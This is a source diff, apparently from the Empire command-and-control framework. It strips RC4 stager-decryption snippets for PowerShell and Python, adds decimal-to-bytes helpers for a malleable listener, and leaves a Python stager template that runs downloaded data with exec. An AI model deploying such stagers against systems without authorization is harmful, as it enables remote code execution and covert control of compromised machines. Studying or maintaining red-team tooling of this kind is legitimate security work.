@@ -1,9 +1,9 @@
 import random
-import string
 from textwrap import dedent
 
 from empire.server.common import helpers
-from empire.server.utils.data_util import ps_convert_to_oneliner
+
+BYTE_MAX = 255
 
 
 def remove_lines_comments(lines):
@@ -17,24 +17,6 @@ def remove_lines_comments(lines):
         if not _line.startswith("#"):
             code += _line
     return code
-
-
-def powershell_rc4():
-    """
-    RC4 Stageer code for PowerShell agent
-    """
-    rc4 = dedent(
-        """
-    $R={$D,$K=$Args;
-    $S=0..255;
-    0..255|%{$J=($J+$S[$_]+$K[$_%$K.Count])%256;
-    $S[$_],$S[$J]=$S[$J],$S[$_]};
-    $D|%{$I=($I+1)%256;$H=($H+$S[$I])%256;
-    $S[$I],$S[$H]=$S[$H],$S[$I];
-    $_-bxor$S[($S[$I]+$S[$H])%256]}};
-    """
-    )
-    return ps_convert_to_oneliner(rc4)
 
 
 def python_safe_checks():
@@ -53,41 +35,57 @@ def python_safe_checks():
     )
 
 
+def looks_like_decimal_blob(b: bytes) -> bool:
+    """
+    Heuristic: returns True if b decodes as ASCII and contains only digits and
+    common separators (space, comma, brackets, newlines, minus).
+    """
+    if not isinstance(b, bytes):
+        return False
+    try:
+        s = bytes(b).decode("ascii")
+    except UnicodeDecodeError:
+        return False
+    if not any(ch.isdigit() for ch in s):  # must contain at least one digit
+        return False
+    allowed = set("0123456789- \t\r\n,;[]()")
+    return all(ch in allowed for ch in s)
+
+
+def decimals_to_bytes(x):
+    """Convert '237 30 211 ...' (bytes or str) into real bytes."""
+    if isinstance(x, bytes):
+        x = bytes(x).decode("ascii")
+    # normalize separators
+    for c in ",;[]()\t\r\n":
+        x = x.replace(c, " ")
+    vals = [int(tok) for tok in x.split() if tok]
+    if not vals:
+        raise ValueError("No integers found")
+    if any(v < 0 or v > BYTE_MAX for v in vals):
+        bad = [v for v in vals if v < 0 or v > BYTE_MAX][:5]
+        raise ValueError(f"Out-of-range byte(s): {bad} (expected 0..255)")
+    return bytes(vals)
+
+
+def ensure_raw_bytes(x):
+    """
+    Helper function for malleable listener where encoding may not be consistent.
+    If x looks like a decimal blob, convert it to raw bytes.
+    """
+    return decimals_to_bytes(x) if looks_like_decimal_blob(x) else bytes(x)
+
+
 def python_extract_stager(staging_key):
     """
     Download the stager and extract the IV for Python agent.
     """
     stager = dedent(
-        f"""
-    # ==== EXTRACT IV AND STAGER ====
-    IV=a[0:4];
-    data=a[4:];
-    key=IV+'{staging_key}'.encode('UTF-8');
-    # ==== DECRYPT STAGER (RC4) ====
-    S,j,out=list(range(256)),0,[];
-    for i in list(range(256)):
-        j=(j+S[i]+key[i%len(key)])%256;
-        S[i],S[j]=S[j],S[i];
-    i=j=0;
-    for char in data:
-        i=(i+1)%256;
-        j=(j+S[i])%256;
-        S[i],S[j]=S[j],S[i];
-        out.append(chr(char^S[(S[i]+S[j])%256]));
-    # ==== EXECUTE STAGER ====
-    exec(''.join(out));
+        """
+    exec(data);
     """
     )
     return helpers.strip_python_comments(stager)
-
-
-def generate_cookie():
-    """
-    Generate Cookie
-    """
-
-    chars = string.ascii_letters
-    return helpers.random_string(random.randint(6, 16), charset=chars)
 
 
 def generate_random_cipher():
